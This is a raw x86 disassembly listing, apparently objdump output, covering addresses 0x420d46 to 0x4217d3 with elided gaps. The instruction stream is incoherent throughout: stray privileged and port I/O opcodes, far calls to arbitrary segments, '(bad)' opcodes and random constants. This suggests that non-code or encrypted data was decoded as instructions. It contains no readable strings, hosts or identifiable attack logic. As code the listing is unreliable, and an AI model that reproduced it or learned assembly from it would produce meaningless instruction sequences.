  420d46:	rcr    cl,0xd2
  420d49:	cdq    
  420d4a:	pop    ecx
  420d4b:	icebp  
  420d4c:	fs inc esp
  420d4e:	les    eax,FWORD PTR [edi-0x6d6d82]
  420d54:	or     BYTE PTR [eax+edx*2+0x300c0550],ah
  420d5b:	inc    edi
  420d5c:	jp     0x420db5
  420d5e:	xor    al,0x9
  420d60:	call   0x1e7b:0xb6262457
  420d67:	add    BYTE PTR [edi+0x2ff41d56],0x8e
  420d6e:	retf   
  420d6f:	push   0xffffffaf
  420d71:	mov    DWORD PTR [ebx+0x6b3684f3],ebx
  420d77:	mov    cl,bh
  420d79:	fcomp  QWORD PTR [eax+ecx*1+0x3c3cb686]
  420d80:	ror    DWORD PTR [ecx],cl
  420d82:	inc    ebp
  420d83:	push   0x49
  420d85:	mov    BYTE PTR [esp+esi*1-0x23a68f95],dl
  420d8c:	test   DWORD PTR [ebx],0x9748
	...
  420df2:	add    BYTE PTR [eax],al
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x2960f268
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	and    dl,BYTE PTR [esi+0x7b5fb465]
  420e12:	neg    DWORD PTR [eax]
  420e14:	in     al,dx
  420e15:	xchg   ecx,eax
  420e16:	sbb    DWORD PTR [ecx],esi
  420e18:	xchg   ebx,eax
  420e19:	cmc    
  420e1a:	add    BYTE PTR [edx-0x778c7bdf],bl
  420e20:	jnp    0x420dbb
  420e22:	in     al,0x11
  420e24:	cwde   
  420e25:	loop   0x420e6b
  420e27:	js     0x420e99
  420e29:	shl    ah,0xdb
  420e2c:	es retf 0xf174
  420e30:	inc    si
  420e32:	arpl   WORD PTR [ebp-0x52e9c25d],sp
  420e38:	pusha  
  420e39:	pop    edx
  420e3a:	xchg   esi,eax
  420e3b:	scas   al,BYTE PTR es:[edi]
  420e3c:	or     DWORD PTR [edi],0xdf39fbe1
  420e42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e43:	in     al,dx
  420e44:	adc    al,0xd5
  420e46:	adc    dh,BYTE PTR [edx-0x575e0410]
  420e4c:	adc    ecx,DWORD PTR [edi]
  420e4e:	retf   0x6030
  420e51:	enter  0xfc70,0x4f
  420e55:	jp     0x420e51
  420e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e58:	lahf   
  420e59:	mov    ebp,0x54a13992
  420e5e:	xchg   DWORD PTR [ecx-0x59],ecx
  420e61:	arpl   WORD PTR [edx],di
  420e63:	jmp    DWORD PTR [eax-0x7a]
  420e66:	and    al,0x2a
  420e68:	pop    ss
  420e69:	inc    eax
  420e6a:	adc    ecx,edi
  420e6c:	test   DWORD PTR [eax],esi
  420e6e:	push   edx
  420e6f:	mov    bh,0xf1
  420e71:	gs loop 0x420e51
  420e74:	jbe    0x420ee7
  420e76:	jp     0x420ebd
  420e78:	gs jge 0x420eaa
  420e7b:	ret    
  420e7c:	test   eax,0x48e2b7a2
  420e81:	jl     0x420e79
  420e83:	ror    dh,cl
  420e85:	fmul   st,st(3)
  420e87:	imul   edi,DWORD PTR [edx-0x4c],0x57
  420e8b:	scas   al,BYTE PTR es:[edi]
  420e8c:	or     esi,DWORD PTR [esi]
  420e8e:	iret   
  420e8f:	cwde   
  420e90:	dec    ebx
  420e91:	push   edx
  420e92:	pop    ss
  420e93:	push   esi
  420e95:	aad    0x9b
  420e97:	sub    ebx,eax
  420e99:	test   esp,edx
  420e9b:	inc    ecx
  420e9c:	(bad)  es:[ebx-0x6d]
  420ea0:	push   edi
  420ea1:	sub    bl,BYTE PTR [edx-0x2a]
  420ea4:	mov    edx,0x993f6025
  420ea9:	test   al,0x5e
  420eab:	int3   
  420eac:	add    ch,BYTE PTR [ecx-0x1daf245a]
  420eb2:	aad    0xd0
  420eb4:	test   eax,0x8329f4c9
  420eb9:	adc    dl,dh
  420ebb:	fs call 0x663e:0x92ec2091
  420ec3:	iret   
  420ec4:	dec    eax
  420ec5:	ror    BYTE PTR [ecx],cl
  420ec7:	aas    
  420ec8:	add    al,0xf6
  420eca:	enter  0x30e7,0x9a
  420ece:	pop    es
  420ecf:	mov    ebx,0x38024729
  420ed4:	test   DWORD PTR [eax],ebx
  420ed6:	sub    bh,BYTE PTR [ecx-0x75]
  420ed9:	in     eax,dx
  420eda:	cld    
  420edb:	push   ebp
  420edc:	mov    cl,0x45
  420ede:	xchg   edx,eax
  420edf:	loopne 0x420ea5
  420ee1:	(bad)  
  420ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ee3:	cmp    ecx,eax
  420ee5:	inc    edx
  420ee6:	ds ss addr16 inc esi
  420eea:	xor    eax,0x41c5901b
  420eef:	cmp    eax,0x38a678fb
  420ef4:	sbb    edi,DWORD PTR [eax-0x642dcbb0]
  420efa:	shl    DWORD PTR [ebp+eiz*2+0x34],1
  420efe:	sbb    DWORD PTR [ebp-0x26],esp
  420f01:	ret    0x703c
  420f04:	pop    edx
  420f05:	sbb    bl,bl
  420f07:	in     al,0x38
  420f09:	mov    dl,0x55
  420f0b:	aam    0xf9
  420f0d:	xor    esp,DWORD PTR [eax]
  420f0f:	cmc    
	...
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi+0x7f3af56e]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	jnp    0x420f6f
  420f8e:	push   ecx
  420f8f:	inc    esp
  420f90:	aam    0xfa
  420f92:	retf   0x752d
  420f95:	push   0xf696576d
  420f9a:	jge    0x42100d
  420f9c:	int    0xe9
  420f9e:	jl     0x420f9f
  420fa0:	pusha  
  420fa1:	sbb    bl,BYTE PTR [ecx+0x29]
  420fa4:	int    0xeb
  420fa6:	xchg   ebp,eax
  420fa7:	(bad)  
  420fa8:	sbb    BYTE PTR [edx-0xf],ah
  420fab:	inc    edi
  420fac:	sbb    DWORD PTR [esp-0x7f],ecx
  420fb0:	(bad)  
  420fb1:	call   0x1684:0x50c8406c
  420fb8:	xlat   BYTE PTR ds:[ebx]
  420fb9:	push   eax
  420fba:	enter  0x3adc,0xe9
  420fbe:	pushf  
  420fbf:	sti    
  420fc0:	(bad)  
  420fc1:	lock and BYTE PTR [ecx],0x46
  420fc5:	pop    ecx
  420fc6:	ds inc eax
  420fc8:	lea    eax,ds:0x146f2499
  420fce:	(bad)  
  420fcf:	into   
  420fd0:	push   cs
  420fd1:	mov    WORD PTR ds:0xc0bc2c98,?
  420fd7:	cmp    eax,0x6187c93e
  420fdc:	inc    DWORD PTR [esi-0x4cf4c20d]
  420fe2:	cmp    BYTE PTR [esi],0x26
  420fe5:	and    eax,0x532d2558
  420fea:	inc    edi
  420feb:	jns    0x421021
  420fed:	push   esp
  420fee:	cmp    BYTE PTR [eax],bh
  420ff0:	mov    ds:0xabad573,al
  420ff5:	ins    BYTE PTR es:[edi],dx
  420ff6:	lock (bad) 
  420ff8:	push   ss
  420ff9:	pop    eax
  420ffa:	mov    ch,0x78
  420ffc:	sti    
  420ffd:	push   ds
  420ffe:	dec    ebx
  420fff:	add    DWORD PTR [ebx],edi
  421001:	jne    0x420fba
  421003:	scas   eax,DWORD PTR es:[edi]
  421004:	inc    esi
  421005:	dec    esp
  421006:	add    eax,0xe2b2a3e6
  42100b:	mov    ebx,0x3e7a93a
  421010:	or     esi,DWORD PTR [edx+0x35ff4751]
  421016:	sbb    ebx,DWORD PTR [eax-0x24a52516]
  42101c:	idiv   DWORD PTR [ebx]
  42101e:	jg     0x420ffd
  421020:	xchg   edi,eax
  421021:	xor    eax,0xa0e43f16
  421026:	jb     0x421038
  421028:	adc    DWORD PTR [ebp+0x6f3cb3b6],esi
  42102e:	xchg   ebp,eax
  42102f:	pop    ds
  421030:	lahf   
  421031:	mov    bl,0xba
  421033:	test   DWORD PTR [esi+0x62],ecx
  421036:	scas   al,BYTE PTR es:[edi]
  421037:	in     al,dx
  421038:	inc    ebp
  421039:	push   ds
  42103a:	and    al,0xc5
  42103c:	mov    ecx,0x742727dc
  421041:	iret   
  421042:	xor    BYTE PTR [eax+ebp*4+0x64],bl
  421046:	jns    0x421059
  421048:	jae    0x42100e
  42104a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42104b:	addr16 push esi
  42104d:	jmp    0x2d991f74
  421052:	adc    ebp,edx
  421054:	xchg   esp,eax
  421055:	pop    eax
  421056:	cmp    al,0x44
  421058:	add    eax,0xac5fe3b2
  42105d:	add    al,0x62
  42105f:	lahf   
  421060:	mov    cl,bl
  421062:	or     BYTE PTR [eax],ch
  421064:	ror    esp,1
  421066:	lods   al,BYTE PTR ds:[esi]
  421067:	sbb    al,0x22
  421069:	jbe    0x4210e6
  42106b:	and    al,0xc0
  42106d:	and    al,0x9
  42106f:	push   ss
  421070:	loop   0x4210b1
  421072:	mov    al,ds:0x7185495b
  421077:	add    bl,bh
  421079:	ins    BYTE PTR es:[edi],dx
  42107a:	add    DWORD PTR [edi],ebp
  42107c:	cld    
  42107d:	outs   dx,DWORD PTR ds:[esi]
  42107e:	imul   ebx,DWORD PTR [ecx+0x447a5928],0x48
  421085:	xor    BYTE PTR ds:0xe8e964bf,dl
  42108b:	imul   BYTE PTR [ebx+0xb]
  42108e:	pop    ss
  42108f:	add    BYTE PTR cs:[eax],al
	...
  4210f2:	add    BYTE PTR [eax],al
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ss,WORD PTR [edx-0x77]
  421102:	push   ss
  421103:	mov    esi,0x1600c
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	ficomp DWORD PTR [edx-0x7c]
  42110f:	daa    
  421110:	cld    
  421111:	aas    
  421112:	outs   dx,BYTE PTR ds:[esi]
  421113:	es xor eax,0xd54a6871
  421119:	adc    ebx,DWORD PTR [esi+0x3c]
  42111c:	call   DWORD PTR [esi+esi*2-0x42]
  421120:	sub    DWORD PTR ds:[esi+0x6cd19467],ebx
  421127:	sub    al,0xb5
  421129:	mov    BYTE PTR [ecx+ebx*8-0xc34d7c5],ch
  421130:	add    DWORD PTR [eax+eiz*8],0x9cb3dbe6
  421137:	aaa    
  421138:	shr    bh,1
  42113a:	pop    ss
  42113b:	xchg   esp,eax
  42113c:	clc    
  42113d:	shr    DWORD PTR [ebx+0x47db13b3],1
  421143:	pop    ebx
  421144:	in     eax,0x45
  421146:	xor    DWORD PTR [esi-0x28cb3615],edx
  42114c:	jl     0x4211a5
  42114e:	and    dl,al
  421150:	add    BYTE PTR [edi-0x12],ah
  421153:	call   0x96d6c875
  421158:	int    0x4e
  42115a:	dec    esi
  42115b:	jmp    0x421181
  42115d:	inc    edx
  42115e:	stos   DWORD PTR es:[edi],eax
  42115f:	jae    0x421159
  421161:	outs   dx,DWORD PTR ds:[esi]
  421162:	stos   BYTE PTR es:[edi],al
  421163:	sbb    DWORD PTR [edi+0x39],esi
  421166:	(bad)  
  421168:	leave  
  421169:	add    bh,cl
  42116b:	popa   
  42116c:	(bad)  
  42116d:	sahf   
  42116e:	push   ecx
  42116f:	mov    eax,ds:0xf789332a
  421174:	cs add ebx,0x76
  421178:	jl     0x4211a5
  42117a:	mov    dl,0xcf
  42117c:	ret    0x8239
  42117f:	pop    ecx
  421180:	jbe    0x421105
  421182:	call   0xe4f:0xfe2a8b17
  421189:	jle    0x421156
  42118b:	clc    
  42118c:	add    BYTE PTR [eax+0x6f50b258],ah
  421192:	mov    ds:0x4560fc54,al
  421197:	mov    esp,es
  421199:	xchg   BYTE PTR [eax],dh
  42119b:	mul    BYTE PTR [esi-0x43]
  42119e:	mov    ds:0x517a5712,eax
  4211a3:	fcmovnu st,st(2)
  4211a5:	jmp    0x421219
  4211a7:	mov    cl,0x36
  4211a9:	es std 
  4211ab:	sbb    al,BYTE PTR [edx]
  4211ad:	jnp    0x42115b
  4211af:	ror    BYTE PTR [eax+0x20c6232f],0x35
  4211b6:	jno    0x4211d1
  4211b8:	shl    BYTE PTR [edi+0x218c0e0b],0xf7
  4211bf:	adc    dl,BYTE PTR [ecx]
  4211c1:	out    dx,eax
  4211c2:	sub    al,0x6e
  4211c4:	jmp    0x42121f
  4211c6:	test   al,0x24
  4211c8:	push   edx
  4211c9:	xchg   ebp,eax
  4211ca:	out    dx,al
  4211cb:	and    al,0x72
  4211cd:	call   0x386fc274
  4211d2:	inc    edx
  4211d3:	(bad)  
  4211d4:	or     al,0xc
  4211d6:	lea    esp,[esi-0x7cf89b86]
  4211dc:	sbb    ch,BYTE PTR [ebp+0x3eeb6cc3]
  4211e2:	sbb    DWORD PTR [eax-0x60b6b598],ebx
  4211e8:	clc    
  4211e9:	cld    
  4211ea:	sti    
  4211eb:	sub    edi,edi
  4211ed:	pushf  
  4211ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211ef:	mov    cl,0xb3
  4211f1:	ins    BYTE PTR es:[edi],dx
  4211f2:	and    eax,0x125da595
  4211f7:	add    BYTE PTR [edx+0x34],bh
  4211fa:	sar    DWORD PTR [ecx+0x2f16f4fc],cl
  421200:	mov    edx,0x2a6c57a5
  421205:	push   ebx
  421206:	and    BYTE PTR [ebp-0x74],dh
  421209:	jne    0x4211ba
  42120b:	aas    
  42120c:	jecxz  0x421206
  42120e:	or     eax,0x70
	...
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0x99037ab3
  421282:	dec    ebx
  421283:	adc    edx,DWORD PTR [eax]
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
  421288:	add    al,0x1
  42128a:	add    BYTE PTR [eax],al
  42128c:	mov    eax,0x44df01dd
  421291:	lds    edi,FWORD PTR [ebx]
  421293:	or     BYTE PTR [edi+0x51],bl
  421296:	pop    ebx
  421297:	jl     0x421227
  421299:	aam    0x21
  42129b:	daa    
  42129c:	(bad)  
  42129d:	sbb    esp,eax
  42129f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212a0:	xchg   ecx,eax
  4212a1:	imul   BYTE PTR [ebx]
  4212a3:	sbb    ebx,esp
  4212a5:	aas    
  4212a6:	pop    edi
  4212a7:	lahf   
  4212a8:	(bad)  
  4212a9:	jecxz  0x4212cb
  4212ab:	mov    fs,WORD PTR [eax+0x62]
  4212ae:	in     eax,dx
  4212af:	push   eax
  4212b0:	sub    al,0xd8
  4212b2:	jge    0x42131d
  4212b4:	fmulp  st(6),st
  4212b6:	push   0xffffffd6
  4212b8:	outs   dx,BYTE PTR ds:[esi]
  4212b9:	call   0xe97dc5ca
  4212be:	sub    BYTE PTR [esi+0x41],ch
  4212c1:	sub    DWORD PTR [edx+eax*8],edi
  4212c4:	inc    edx
  4212c5:	iret   
  4212c6:	or     esi,DWORD PTR [esi-0x7d8b6b76]
  4212cc:	push   dx
  4212ce:	shr    edx,1
  4212d0:	push   esi
  4212d1:	in     eax,0x7f
  4212d3:	int    0x4
  4212d5:	leave  
  4212d6:	and    edi,DWORD PTR ds:0xa551cfb1
  4212dc:	add    al,0x89
  4212de:	dec    esi
  4212df:	in     al,0xc0
  4212e1:	add    eax,0x3e0ae30e
  4212e6:	sbb    DWORD PTR [ebx],0x2820410c
  4212ec:	sbb    edx,DWORD PTR [esi]
  4212ee:	mov    dl,0xd9
  4212f0:	push   edi
  4212f1:	xchg   edx,eax
  4212f2:	icebp  
  4212f3:	lds    esi,FWORD PTR [ebx]
  4212f5:	lock mov BYTE PTR [esi-0x9c3cddd],dh
  4212fc:	xor    bl,ch
  4212fe:	dec    ecx
  4212ff:	fld    DWORD PTR [edi+0x30454f1]
  421305:	pop    edx
  421306:	inc    edx
  421307:	push   es
  421308:	add    al,0x72
  42130a:	hlt    
  42130b:	stos   DWORD PTR es:[edi],eax
  42130c:	pop    edi
  42130d:	aas    
  42130e:	popf   
  42130f:	jo     0x421344
  421311:	push   0x53
  421313:	repnz inc esi
  421315:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421316:	(bad)  
  421318:	mov    ds,WORD PTR [ecx-0x5f6bf3cf]
  42131e:	xchg   DWORD PTR [edi-0x63e2a1ec],ebp
  421324:	loope  0x4213a1
  421326:	lods   al,BYTE PTR ds:[esi]
  421327:	pop    eax
  421328:	repz push eax
  42132a:	sub    al,0x31
  42132c:	pushf  
  42132d:	enter  0x597f,0xa1
  421331:	enter  0x2b46,0xdc
  421335:	std    
  421336:	cmc    
  421337:	cwde   
  421338:	retf   
  421339:	aam    0x32
  42133b:	jmp    0x421378
  42133d:	push   ss
  42133e:	mov    dl,0xcb
  421340:	push   esp
  421341:	mov    al,ds:0xa4e80647
  421346:	pop    es
  421347:	adc    dh,dl
  421349:	mov    eax,0xa9987989
  42134e:	dec    edi
  42134f:	fcom   QWORD PTR [edi]
  421351:	test   eax,0x1a30210e
  421356:	fild   WORD PTR [ecx-0x26]
  421359:	dec    ecx
  42135a:	nop
  42135b:	pop    edx
  42135c:	inc    ecx
  42135d:	fdivr  QWORD PTR [ecx+0x37177d89]
  421363:	dec    ecx
  421364:	loop   0x4213cc
  421366:	pop    ss
  421367:	ja     0x4213cc
  421369:	adc    BYTE PTR [ecx+0x118b50b3],dl
  42136f:	push   0x54
  421371:	adc    eax,0x5214a3c5
  421376:	mov    ebx,0xcd0932b1
  42137b:	pusha  
  42137c:	(bad)  
  42137d:	(bad)  
  42137f:	add    bh,BYTE PTR [eax-0x38909349]
  421385:	into   
  421386:	imul   BYTE PTR [ecx+0xfe6b618]
  42138c:	mov    bh,0x5d
  42138e:	ins    BYTE PTR es:[edi],dx
  42138f:	imul   eax,DWORD PTR [eax],0x0
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x46690b61]
  421402:	xor    eax,0x1621414
  421407:	add    BYTE PTR [ecx+eax*1],al
  42140a:	add    BYTE PTR [eax],al
  42140c:	loope  0x4213a7
  42140e:	(bad)  
  42140f:	shr    DWORD PTR [eax-0x43f5b465],cl
  421415:	jecxz  0x42145a
  421417:	mov    ebx,0xcc18b235
  42141c:	popa   
  42141d:	sbb    eax,0xa65670f7
  421422:	in     al,dx
  421423:	bound  edi,QWORD PTR ds:0x139d287f
  421429:	mov    esi,0x8d0c41fe
  42142e:	imul   ebx,DWORD PTR [ebp+0x29],0xffd7840b
  421435:	ins    BYTE PTR es:[edi],dx
  421436:	push   ebx
  421437:	xor    DWORD PTR [edx*8-0x1d223e27],esi
  42143e:	push   cs
  42143f:	out    0xad,al
  421441:	cmc    
  421442:	mov    ebx,0xda5bb2fc
  421447:	out    dx,eax
  421448:	push   ecx
  42144a:	inc    edi
  42144b:	sub    dx,WORD PTR [eax]
  42144e:	push   0xffffff80
  421450:	js     0x421441
  421452:	out    0xb4,al
  421454:	loope  0x42144a
  421456:	xchg   ebx,eax
  421457:	std    
  421458:	pop    edx
  421459:	fld    DWORD PTR [esi+0x2b121417]
  42145f:	push   es
  421460:	fnsave [eax+0x16]
  421463:	xor    eax,0x25ef8ce0
  421468:	aad    0xd4
  42146a:	mov    edx,0x6d9ebab5
  42146f:	ret    
  421470:	adc    BYTE PTR [edi+0x75],ah
  421473:	push   edi
  421474:	mov    WORD PTR [edx+0x79],ds
  421477:	clc    
  421478:	sbb    esi,ebp
  42147a:	jnp    0x4214e2
  42147c:	or     BYTE PTR [edx+edx*2-0x3f],bl
  421480:	xor    eax,0x48063d4d
  421485:	int    0x60
  421487:	ret    
  421488:	adc    eax,0x5298ed22
  42148d:	xor    dl,dh
  42148f:	xor    BYTE PTR [edi-0x3e71b783],ch
  421495:	xchg   ecx,eax
  421496:	sub    BYTE PTR [esi],bl
  421498:	rcr    BYTE PTR [ecx],1
  42149a:	test   al,0x73
  42149c:	lds    esp,FWORD PTR [ebx+0x41b62fee]
  4214a2:	or     eax,0xddae523e
  4214a7:	scas   eax,DWORD PTR es:[edi]
  4214a8:	fisubr WORD PTR [ebx]
  4214aa:	ja     0x42143f
  4214ac:	dec    edx
  4214ad:	push   cs
  4214ae:	jmp    0x421504
  4214b0:	les    ebx,FWORD PTR [ecx+0xd]
  4214b3:	xchg   edi,eax
  4214b4:	repz lahf 
  4214b6:	cmp    ebx,esi
  4214b8:	mov    edi,DWORD PTR [edx-0x37]
  4214bb:	cmp    eax,0x39dbd62c
  4214c0:	ja     0x421541
  4214c2:	xchg   edi,eax
  4214c3:	lods   eax,DWORD PTR gs:[esi]
  4214c5:	adc    dh,ah
  4214c7:	mov    eax,ds:0x5776c891
  4214cc:	js     0x421505
  4214ce:	dec    ebx
  4214cf:	ret    0xa1f5
  4214d2:	xchg   esp,eax
  4214d3:	xchg   ecx,eax
  4214d4:	lods   eax,DWORD PTR ds:[esi]
  4214d5:	xor    BYTE PTR [ebx-0x21505714],bl
  4214db:	leave  
  4214dc:	adc    eax,DWORD PTR [ebx]
  4214de:	cld    
  4214df:	gs in  eax,dx
  4214e1:	push   ebp
  4214e2:	and    DWORD PTR [edx-0x9ae1d95],esp
  4214e8:	add    esi,DWORD PTR [esi]
  4214ea:	sahf   
  4214eb:	dec    esi
  4214ec:	jns    0x421546
  4214ee:	repnz not esi
  4214f1:	ja     0x421480
  4214f3:	xor    al,0x7d
  4214f5:	ror    ecx,0x44
  4214f8:	dec    ebx
  4214f9:	lock cmp BYTE PTR [edx+0x54],ah
  4214fd:	pop    ebx
  4214fe:	or     eax,0x73d33aa9
  421503:	aas    
  421504:	xchg   edi,eax
  421505:	cmp    BYTE PTR [ecx],bh
  421507:	sub    eax,0x2064d0cd
  42150c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42150d:	imul   ebx,DWORD PTR [esi+eax*2+0x0],0x0
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x2b242b4],bp
  421582:	mov    al,0xef
  421584:	sbb    BYTE PTR [ebx+0x1],ah
  421587:	add    BYTE PTR [ecx+eax*1],al
  42158a:	add    BYTE PTR [eax],al
  42158c:	dec    eax
  42158d:	mov    edx,0x709c0518
  421592:	push   ebp
  421593:	add    DWORD PTR [edi+0x29],esp
  421596:	add    DWORD PTR [ebp-0x1ada4e8e],ebp
  42159c:	jmp    0x4215a2
  42159e:	jo     0x42155b
  4215a0:	mov    esp,0x4476c26c
  4215a5:	push   es
  4215a6:	sbb    bl,cl
  4215a8:	aam    0x22
  4215aa:	push   0xfffffff8
  4215ac:	push   eax
  4215ad:	cmp    eax,0xb8608be6
  4215b2:	jmp    0x69ad:0x9ea9f081
  4215b9:	add    dl,0xce
  4215bc:	lock pop esi
  4215be:	inc    ebx
  4215bf:	xchg   BYTE PTR [edx+0x36308081],al
  4215c5:	enter  0x6823,0xfb
  4215c9:	mov    ebx,0x38ea10f7
  4215ce:	jne    0x42155b
  4215d0:	(bad)  
  4215d1:	jle    0x4215d5
  4215d3:	mov    ebx,DWORD PTR [edx]
  4215d5:	stc    
  4215d6:	repnz inc ebx
  4215d8:	out    dx,eax
  4215d9:	push   ebp
  4215da:	and    cl,BYTE PTR [ebx+0x40]
  4215dd:	inc    esp
  4215de:	xchg   DWORD PTR [ecx+ecx*8-0x5ca17657],esi
  4215e5:	mov    edx,0x90627404
  4215ea:	push   0xf7ac4ad9
  4215ef:	or     al,ah
  4215f1:	pop    ebx
  4215f2:	fidiv  DWORD PTR [ebx-0x5623ce33]
  4215f8:	inc    esi
  4215f9:	lock fwait
  4215fb:	inc    eax
  4215fc:	inc    ebx
  4215fd:	dec    eax
  4215fe:	test   DWORD PTR [edx+0xc],ecx
  421601:	mov    ecx,0xf1030d0f
  421606:	sti    
  421607:	and    ebp,esp
  421609:	jno    0x4215b1
  42160b:	retf   0x1013
  42160e:	adc    BYTE PTR [eax-0x7c84905],ch
  421614:	imul   edi,DWORD PTR [ebp+0x427ac545],0xffffff95
  42161b:	shl    BYTE PTR [edx-0x47],1
  42161e:	cwde   
  42161f:	or     al,0xa5
  421621:	mov    edx,0xadc8e695
  421626:	jl     0x421679
  421628:	mov    ch,0x66
  42162a:	daa    
  42162b:	jecxz  0x421695
  42162d:	jo     0x421642
  42162f:	and    eax,0x470f210b
  421634:	fldcw  WORD PTR [esi]
  421636:	fld    st(7)
  421638:	out    dx,eax
  421639:	pop    edi
  42163a:	ret    0xf05
  42163d:	inc    ebp
  42163e:	(bad)  
  42163f:	dec    ebp
  421640:	adc    DWORD PTR [ecx+0x3e],edi
  421643:	mov    WORD PTR [ebx+0x31],es
  421646:	mov    ecx,0x593b0407
  42164b:	xchg   edx,eax
  42164c:	mov    cl,0xe3
  42164e:	mov    ds:0xd57451ab,al
  421653:	mov    ch,dl
  421655:	out    0xc4,eax
  421657:	sub    al,0x80
  421659:	mov    ebp,ds
  42165b:	cwde   
  42165c:	pop    edx
  42165d:	gs popf 
  42165f:	inc    ebx
  421660:	fs inc ebx
  421662:	lock mov DWORD PTR [edi+esi*2],0x6f514e37
  42166a:	cmp    al,0xcc
  42166c:	retf   0x4e3d
  42166f:	jmp    0x42165f
  421671:	test   DWORD PTR ds:0x87b9b062,eax
  421677:	adc    BYTE PTR [eax-0x31af0920],0x4
  42167e:	adc    BYTE PTR [ebp-0x34],bh
  421681:	xchg   BYTE PTR [ebx-0x661749af],dl
  421687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421688:	push   ecx
  421689:	inc    eax
  42168a:	dec    esi
  42168b:	xor    BYTE PTR [edx+edx*2],0x33
  42168f:	push   0x0
	...
  4216f1:	add    BYTE PTR [eax],al
  4216f3:	add    BYTE PTR [ebx-0x105512d4],ch
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	xchg   ecx,eax
  421701:	cmp    dh,BYTE PTR [esi+0x1641c96]
  421707:	add    BYTE PTR [ecx+eax*1],al
  42170a:	add    BYTE PTR [eax],al
  42170c:	iret   
  42170d:	jbe    0x4216fc
  42170f:	sbb    BYTE PTR [eax+edx*4-0x13c4bd7],bh
  421716:	push   cs
  421717:	cmp    BYTE PTR [eax+0x26483860],ch
  42171d:	push   es
  42171e:	xchg   ebp,eax
  42171f:	hlt    
  421720:	ret    
  421721:	and    DWORD PTR [ecx],edi
  421723:	nop
  421724:	cmp    DWORD PTR [ebp-0x35],0x4e
  421728:	cld    
  421729:	stos   DWORD PTR es:[edi],eax
  42172a:	xor    ah,BYTE PTR [ebx]
  42172c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42172e:	lods   eax,DWORD PTR ds:[esi]
  42172f:	mov    edx,0xe3a2c539
  421734:	adc    eax,0xff025ba2
  421739:	xchg   edx,eax
  42173a:	cli    
  42173b:	pop    ss
  42173c:	xchg   ecx,eax
  42173d:	dec    edi
  42173e:	cwde   
  42173f:	adc    eax,0xe7abf47c
  421744:	into   
  421745:	mov    BYTE PTR [ecx],0x2
  421748:	les    ebx,FWORD PTR [eax-0x3e]
  42174b:	jne    0x42174c
  42174d:	add    al,0xb0
  42174f:	std    
  421750:	imul   eax,DWORD PTR [edi],0x59
  421753:	cs fdivp st(5),st
  421756:	enter  0xaf0,0x11
  42175a:	pop    ecx
  42175b:	in     al,dx
  42175c:	jle    0x4216e0
  42175e:	data16 shl BYTE PTR [eax],cl
  421761:	dec    edx
  421762:	gs cmp al,0x5c
  421765:	sub    al,0x45
  421767:	sbb    cl,BYTE PTR [ecx-0x4a88d22e]
  42176d:	adc    al,0x28
  42176f:	or     BYTE PTR [eax-0x325ee317],al
  421775:	push   0x53
  421777:	sbb    DWORD PTR [edi+0x5ac6c5cf],0xffffffe9
  42177e:	push   ecx
  42177f:	and    al,bl
  421781:	mov    edx,0x8abdc445
  421786:	jno    0x4217e8
  421788:	xchg   ebx,eax
  421789:	mov    ecx,0xbc0db68f
  42178e:	fst    DWORD PTR [edi-0x76]
  421791:	dec    ebp
  421792:	adc    ebx,edi
  421794:	add    dl,BYTE PTR [edi]
  421796:	mov    edi,0x8eedd346
  42179b:	cwde   
  42179c:	std    
  42179d:	cld    
  42179e:	xor    DWORD PTR [edi+0x703b2305],0xbee7320f
  4217a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217a9:	pop    edx
  4217aa:	and    ebx,esi
  4217ac:	mov    esi,DWORD PTR [eax+0x34]
  4217af:	and    BYTE PTR [edi+ecx*1+0x898fe95],dl
  4217b6:	pushf  
  4217b7:	mov    fs,WORD PTR [eax-0xf]
  4217ba:	dec    esp
  4217bb:	ss int 0x8
  4217be:	jbe    0x42174c
  4217c0:	push   ebp
  4217c1:	or     ebx,DWORD PTR [esi+0x5ed77ec]
  4217c7:	inc    eax
  4217c8:	cwde   
  4217c9:	push   eax
  4217ca:	inc    ecx
  4217cb:	pop    ss
  4217cc:	cmp    dh,BYTE PTR [ecx-0x584f6d12]
  4217d2:	xlat   BYTE PTR ds:[ebx]
  4217d3:	pop    ebx
